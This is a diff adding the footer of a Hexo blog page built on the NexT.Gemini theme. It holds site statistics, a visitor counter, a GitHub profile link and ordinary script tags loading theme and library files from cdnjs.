+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Word count total">672k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">10:11</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/le0n-daily" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.min.js","integrity":"sha256-G8ouPAnw4zzMbnAenHnVz6h9XpKbNdOkrqTh7AadyHs="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
